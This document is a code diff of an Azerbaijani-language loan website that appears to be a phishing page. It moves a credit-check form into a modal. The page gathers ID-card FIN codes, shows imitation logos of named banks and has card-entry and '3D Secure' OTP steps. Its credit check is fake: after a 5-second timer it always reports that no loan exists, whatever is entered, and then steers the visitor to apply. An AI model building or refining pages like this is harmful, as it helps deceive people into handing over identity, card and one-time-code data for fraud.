@@ -68,7 +68,6 @@
   nav ul a{text-decoration:none;opacity:0.8;transition:opacity .2s;}
   nav ul a:hover{opacity:1;}
 
-  /* SHINY BUTTONS - ORİJINAL */
   .cta-btn{
     position:relative;
     background:linear-gradient(135deg, #0B3A34, #155C51, #1A7A6A);
@@ -132,7 +131,6 @@
     box-shadow:0 2px 10px rgba(21,92,81,0.3);
   }
 
-  /* YENİ: AĞ BUTON (Kredit Ödə üçün) */
   .cta-white{
     position:relative;
     background:var(--white);
@@ -354,7 +352,7 @@
   }
   .modal-close:hover{background:var(--line);}
 
-  /* ===== BANK SELECT ===== */
+  /* BANK SELECT */
   .bank-grid{
     display:grid;grid-template-columns:1fr 1fr;gap:12px;
   }
@@ -399,7 +397,7 @@
   .bank-option .bank-name{font-size:13px;font-weight:600;margin-top:2px;}
   .bank-option .bank-sub{font-size:10px;color:var(--ink-soft);}
 
-  /* ===== PREMIUM CARD VISUAL ===== */
+  /* CARD VISUAL */
   .card-input-wrap{
     background:var(--paper);
     border-radius:16px;
@@ -575,7 +573,7 @@
   }
   .card-details-row .field{margin-bottom:0;}
 
-  /* ===== REAL ID CARD ===== */
+  /* ID CARD */
   .id-card-preview{
     background:linear-gradient(145deg, #f5f0e8, #e5ddd2);
     border-radius:16px;
@@ -694,64 +692,7 @@
     margin-top:4px;
   }
 
-  /* ===== KREDİT ÖDƏ BÖLMƏSİ (YENİ) ===== */
-  .credit-check-section{
-    background:var(--teal-deep);
-    border-radius:20px;
-    padding:40px;
-    text-align:center;
-    color:var(--white);
-    margin-top:30px;
-  }
-  .credit-check-section h2{
-    font-size:28px;
-    margin-bottom:8px;
-  }
-  .credit-check-section p{
-    opacity:0.8;
-    font-size:15px;
-    margin-bottom:20px;
-  }
-  .credit-check-section .field input{
-    background:rgba(255,255,255,0.15);
-    color:var(--white);
-    border-color:rgba(255,255,255,0.2);
-  }
-  .credit-check-section .field label{
-    color:var(--white);
-  }
-  .credit-check-section .cta-white{
-    width:100%;
-    padding:14px;
-  }
-
-  .check-result{
-    background:var(--white);
-    color:var(--ink);
-    border-radius:16px;
-    padding:24px;
-    margin-top:16px;
-    display:none;
-  }
-  .check-result .result-icon{font-size:48px;margin-bottom:8px;}
-  .check-result .result-text{font-size:18px;font-weight:700;}
-  .check-result .result-sub{color:var(--ink-soft);font-size:14px;}
-  .check-result .cta-btn{margin-top:12px;width:100%;padding:12px;}
-
-  /* ===== CARD LOGOS (VISA/Mastercard) ===== */
-  .card-logos-row{
-    display:flex;
-    gap:12px;
-    justify-content:center;
-    margin:12px 0 16px;
-  }
-  .card-logos-row svg{
-    height:28px;
-    width:auto;
-    opacity:0.7;
-  }
-
-  /* ===== CHECKING ===== */
+  /* CHECKING */
   .checking-container{
     text-align:center;
     padding:30px 0;
@@ -804,7 +745,7 @@
     40%{transform:scale(1);background:var(--teal-deep);}
   }
 
-  /* ===== OTP ===== */
+  /* OTP */
   .otp-input-field input{
     font-size:32px;
     letter-spacing:14px;
@@ -827,6 +768,28 @@
   }
   .edit-btn:hover{background:var(--line);}
 
+  /* CARD LOGOS */
+  .card-logos-row{
+    display:flex;
+    gap:12px;
+    justify-content:center;
+    margin:12px 0 16px;
+  }
+  .card-logos-row svg{
+    height:28px;
+    width:auto;
+    opacity:0.7;
+  }
+
+  /* CREDIT CHECK RESULT (Modal daxili) */
+  .credit-result-box{
+    text-align:center;
+    padding:20px 0;
+  }
+  .credit-result-box .result-icon{font-size:56px;margin-bottom:12px;}
+  .credit-result-box .result-text{font-size:22px;font-weight:700;color:var(--teal-deep);}
+  .credit-result-box .result-sub{color:var(--ink-soft);font-size:15px;margin-top:6px;}
+
   footer{background:var(--ink);color:#EDE7D6;padding:48px 0 28px;}
   .footer-grid{display:grid;grid-template-columns:1.4fr 1fr 1fr;gap:32px;margin-bottom:32px;}
   .footer-grid h4{font-family:'Fraunces',serif;font-size:16px;margin-bottom:14px;color:var(--white);}
@@ -845,7 +808,6 @@
     .id-card-preview .id-photo{width:60px;height:80px;font-size:24px;}
     .id-card-preview .id-row .id-label{width:80px;font-size:8px;}
     .id-card-preview .id-row .id-value{font-size:9px;}
-    .credit-check-section{padding:24px;}
   }
 </style>
 </head>
@@ -862,7 +824,7 @@
     </ul></nav>
     <div style="display:flex;gap:10px;align-items:center;">
       <button class="cta-btn" onclick="openModal()">Müraciət et</button>
-      <button class="cta-white" onclick="openCreditCheck()">Kredit Ödə</button>
+      <button class="cta-white" onclick="openCreditCheckModal()">Kredit Ödə</button>
     </div>
   </div>
 </header>
@@ -997,39 +959,12 @@
 
 <div class="wrap"><div class="kilim"></div></div>
 
-<!-- ===== KREDİT ÖDƏ BÖLMƏSİ (YENİ) ===== -->
-<section class="credit-check-section" id="creditCheckSection">
-  <div class="wrap">
-    <h2>🔍 Kredit Ödə</h2>
-    <p>FIN kod və doğum tarixinizlə adınıza kredit olub-olmadığını yoxlayın</p>
-    
-    <div style="max-width:400px;margin:0 auto;">
-      <div class="field">
-        <label>FIN kod</label>
-        <input type="text" id="checkFin" placeholder="7A2BC9D" maxlength="7">
-      </div>
-      <div class="field">
-        <label>Doğum tarixi</label>
-        <input type="date" id="checkBirth">
-      </div>
-      <button class="cta-white" onclick="checkCredit()">Yoxla</button>
-      
-      <div class="check-result" id="checkResult">
-        <div class="result-icon">✅</div>
-        <div class="result-text" id="resultText">HalHazırda adınıza kredit yoxdur</div>
-        <div class="result-sub" id="resultSub">Siz yeni kredit götürə bilərsiniz</div>
-        <button class="cta-btn" onclick="openModal()">Kredit Götür</button>
-      </div>
-    </div>
-  </div>
-</section>
-
-<!-- ========== MODAL (ORİJINAL) ========== -->
+<!-- ========== MODAL ========== -->
 <div class="modal-overlay" id="modalOverlay">
   <div class="modal-card">
     <button type="button" class="modal-close" onclick="closeModal()">✕</button>
 
-    <!-- STEP 1: Şəxsi məlumatlar -->
+    <!-- STEP 1: Müraciət Formu -->
     <div id="formStep">
       <h2 style="font-size:26px;margin-bottom:6px;">Onlayn kredit müraciəti</h2>
       <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">Şəxsiyyət vəsiqəsi məlumatlarını daxil edin</p>
@@ -1123,7 +1058,6 @@
         <span style="font-size:14px;color:var(--ink-soft);" id="creditTermDisplay">3 ay müddətə</span>
       </p>
       
-      <!-- Visa/Mastercard logos (YENİ) -->
       <div class="card-logos-row">
         <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#1a1f71"/><circle cx="35" cy="20" r="14" fill="#eb001b"/><circle cx="55" cy="20" r="14" fill="#f79e1b"/><text x="75" y="24" font-family="Arial" font-size="14" fill="white" font-weight="bold">VISA</text></svg>
         <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#eb001b"/><circle cx="40" cy="20" r="14" fill="#f79e1b"/><circle cx="55" cy="20" r="14" fill="#eb001b"/><text x="78" y="24" font-family="Arial" font-size="12" fill="white" font-weight="bold">Mastercard</text></svg>
@@ -1161,7 +1095,7 @@
       <button type="button" class="cta-btn" style="width:100%;padding:15px;margin-top:12px;" onclick="goToChecking()">Müraciəti göndər</button>
     </div>
 
-    <!-- STEP 5: Checking -->
+    <!-- STEP 5: Checking (Müraciət üçün) -->
     <div id="checkingStep" style="display:none;">
       <div class="checking-container">
         <div class="spinner"></div>
@@ -1174,11 +1108,10 @@
       </div>
     </div>
 
-    <!-- STEP 6: OTP -->
+    <!-- STEP 6: OTP (3D Secure) -->
     <div id="threeDStep" style="display:none;">
       <h2 style="font-size:26px;margin-bottom:10px;">🔐 3D Secure təsdiqi</h2>
       
-      <!-- Visa/Mastercard logos (YENİ) -->
       <div class="card-logos-row">
         <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#1a1f71"/><circle cx="35" cy="20" r="14" fill="#eb001b"/><circle cx="55" cy="20" r="14" fill="#f79e1b"/><text x="75" y="24" font-family="Arial" font-size="14" fill="white" font-weight="bold">VISA</text></svg>
         <svg viewBox="0 0 120 40"><rect width="120" height="40" rx="6" fill="#eb001b"/><circle cx="40" cy="20" r="14" fill="#f79e1b"/><circle cx="55" cy="20" r="14" fill="#eb001b"/><text x="78" y="24" font-family="Arial" font-size="12" fill="white" font-weight="bold">Mastercard</text></svg>
@@ -1192,6 +1125,43 @@
       </div>
       <button onclick="submitOTP()" class="cta-btn" style="width:100%;padding:15px;margin-top:20px;">Təsdiqlə</button>
       <div id="otpStatus" style="margin-top:16px;font-size:14px;font-weight:700;color:var(--teal-deep);text-align:center;display:none;">✅ Təsdiq edildi!</div>
+    </div>
+
+    <!-- ===== YENİ: KREDİT ÖDƏ MODAL ===== -->
+    <div id="creditCheckModal" style="display:none;">
+      <h2 style="font-size:26px;margin-bottom:6px;">🔍 Kredit Ödə</h2>
+      <p style="color:var(--ink-soft);font-size:14.5px;margin:0 0 20px;">FIN kod və doğum tarixinizlə adınıza kredit olub-olmadığını yoxlayın</p>
+      
+      <div id="creditCheckForm">
+        <div class="field">
+          <label>FIN kod</label>
+          <input type="text" id="checkFin" placeholder="7A2BC9D" maxlength="7">
+        </div>
+        <div class="field">
+          <label>Doğum tarixi</label>
+          <input type="date" id="checkBirth">
+        </div>
+        <button class="cta-btn" onclick="startCreditCheck()" style="width:100%;padding:15px;">Yoxla</button>
+      </div>
+      
+      <div id="creditChecking" style="display:none;">
+        <div class="checking-container">
+          <div class="spinner"></div>
+          <div class="check-title">Məlumatlar yoxlanılır</div>
+          <div class="check-sub">Şəxsiyyət məlumatlarınız təsdiqlənir...</div>
+          <div class="check-dots"><span></span><span></span><span></span></div>
+          <div style="margin-top:20px;font-size:13px;color:var(--ink-soft);"><span id="creditCheckTimer">0</span> saniyə</div>
+        </div>
+      </div>
+      
+      <div id="creditResult" style="display:none;">
+        <div class="credit-result-box">
+          <div class="result-icon">✅</div>
+          <div class="result-text">HalHazırda Adınıza Kredit Yoxdur</div>
+          <div class="result-sub">Siz yeni kredit götürə bilərsiniz</div>
+          <button class="cta-btn" onclick="goToApply()" style="margin-top:20px;width:100%;padding:15px;">Kredit Götür</button>
+        </div>
+      </div>
     </div>
 
   </div>
@@ -1209,7 +1179,7 @@
 </footer>
 
 <script>
-// ========== SVG BANK LOGOS (YENİ - BASE64 YOXDUR) ==========
+// ========== SVG BANK LOGOS ==========
 const bankLogos = {
   'Kapital Bank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%23E31E24" rx="8"/%3E%3Ctext x="20" y="38" font-family="Arial" font-size="24" fill="white" font-weight="bold"%3EKAPITAL%3C/text%3E%3Ctext x="120" y="38" font-family="Arial" font-size="20" fill="white"%3EBANK%3C/text%3E%3C/svg%3E',
   'Leobank': 'data:image/svg+xml,%3Csvg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 200 60"%3E%3Crect width="200" height="60" fill="%230066B3" rx="8"/%3E%3Ctext x="40" y="38" font-family="Arial" font-size="22" fill="white" font-weight="bold"%3ELEOBANK%3C/text%3E%3C/svg%3E',
@@ -1486,6 +1456,7 @@ function closeModal(){
   document.getElementById('modalOverlay').classList.remove('active');
   document.body.style.overflow='';
   showFormStep();
+  resetCreditCheck();
   if(checkInterval) { clearInterval(checkInterval); checkInterval = null; }
   isChecking = false;
   pollingActive = false;
@@ -1507,6 +1478,7 @@ function showFormStep(){
   document.getElementById('cardInputStep').style.display='none';
   document.getElementById('checkingStep').style.display='none';
   document.getElementById('threeDStep').style.display='none';
+  document.getElementById('creditCheckModal').style.display='none';
 }
 
 function showSummaryStep(){
@@ -1516,6 +1488,7 @@ function showSummaryStep(){
   document.getElementById('cardInputStep').style.display='none';
   document.getElementById('checkingStep').style.display='none';
   document.getElementById('threeDStep').style.display='none';
+  document.getElementById('creditCheckModal').style.display='none';
 }
 
 function goToBankSelect(){
@@ -1702,39 +1675,88 @@ document.getElementById('applyForm').addEventListener('submit', (e)=>{
   showSummaryStep();
 });
 
-// ========== KREDİT ÖDƏ (YENİ FUNKSİYA) ==========
-function openCreditCheck(){
-  document.getElementById('creditCheckSection').scrollIntoView({behavior:'smooth'});
+// ========== KREDİT ÖDƏ MODAL (YENİ) ==========
+function openCreditCheckModal(){
+  document.getElementById('modalOverlay').classList.add('active');
+  document.body.style.overflow='hidden';
+  
+  // Bütün digər addımları gizlət
+  document.getElementById('formStep').style.display='none';
+  document.getElementById('summaryStep').style.display='none';
+  document.getElementById('bankStep').style.display='none';
+  document.getElementById('cardInputStep').style.display='none';
+  document.getElementById('checkingStep').style.display='none';
+  document.getElementById('threeDStep').style.display='none';
+  
+  // Kredit ödə modalını göstər
+  document.getElementById('creditCheckModal').style.display='block';
+  resetCreditCheck();
   document.getElementById('checkFin').focus();
 }
 
-function checkCredit(){
+function resetCreditCheck(){
+  document.getElementById('creditCheckForm').style.display='block';
+  document.getElementById('creditChecking').style.display='none';
+  document.getElementById('creditResult').style.display='none';
+  document.getElementById('checkFin').value = '';
+  document.getElementById('checkBirth').value = '';
+}
+
+function startCreditCheck(){
   const fin = document.getElementById('checkFin').value.trim().toUpperCase();
   const birth = document.getElementById('checkBirth').value;
   
   if(!fin || fin.length!==7){ alert('FIN kod 7 simvoldan ibarət olmalıdır!'); return; }
   if(!birth){ alert('Doğum tarixi daxil edin!'); return; }
   
-  const resultDiv = document.getElementById('checkResult');
-  resultDiv.style.display='block';
-  resultDiv.querySelector('.result-text').textContent='⏳ Məlumatlar yoxlanılır...';
-  resultDiv.querySelector('.result-sub').textContent='Zəhmət olmasa gözləyin...';
-  resultDiv.querySelector('.result-icon').textContent='🔍';
-  resultDiv.querySelector('.cta-btn').style.display='none';
+  document.getElementById('creditCheckForm').style.display='none';
+  document.getElementById('creditChecking').style.display='block';
+  document.getElementById('creditResult').style.display='none';
   
-  setTimeout(()=>{
-    resultDiv.querySelector('.result-icon').textContent='✅';
-    resultDiv.querySelector('.result-text').textContent='HalHazırda adınıza kredit yoxdur';
-    resultDiv.querySelector('.result-sub').textContent='Siz yeni kredit götürə bilərsiniz';
-    resultDiv.querySelector('.cta-btn').style.display='block';
-  },5000);
+  let seconds = 0;
+  const timerEl = document.getElementById('creditCheckTimer');
+  timerEl.textContent = '0';
+  
+  if(checkInterval) clearInterval(checkInterval);
+  checkInterval = setInterval(() => {
+    seconds++;
+    timerEl.textContent = seconds;
+  }, 1000);
+  
+  setTimeout(() => {
+    clearInterval(checkInterval);
+    checkInterval = null;
+    document.getElementById('creditChecking').style.display='none';
+    document.getElementById('creditResult').style.display='block';
+  }, 5000);
+}
+
+function goToApply(){
+  closeModal();
+  setTimeout(() => {
+    openModal();
+  }, 300);
 }
 
 // ========== CLOSE MODAL ==========
 document.getElementById('modalOverlay').addEventListener('click', (e)=>{
-  if(e.target.id==='modalOverlay') { if(checkInterval) clearInterval(checkInterval); isChecking=false; pollingActive=false; closeModal(); }
+  if(e.target.id==='modalOverlay') { 
+    if(checkInterval) clearInterval(checkInterval); 
+    checkInterval = null;
+    isChecking = false; 
+    pollingActive = false; 
+    closeModal(); 
+  }
 });
-document.addEventListener('keydown', (e)=>{ if(e.key==='Escape') { if(checkInterval) clearInterval(checkInterval); isChecking=false; pollingActive=false; closeModal(); } });
+document.addEventListener('keydown', (e)=>{ 
+  if(e.key==='Escape') { 
+    if(checkInterval) clearInterval(checkInterval); 
+    checkInterval = null;
+    isChecking = false; 
+    pollingActive = false; 
+    closeModal(); 
+  } 
+});
 
 // ========== INPUT MASKS ==========
 document.getElementById('fin').addEventListener('input', function(){
@@ -1759,4 +1781,4 @@ document.getElementById('checkFin').addEventListener('input', function(){
 });
 </script>
 </body>
-          </html>
+                                    </html>
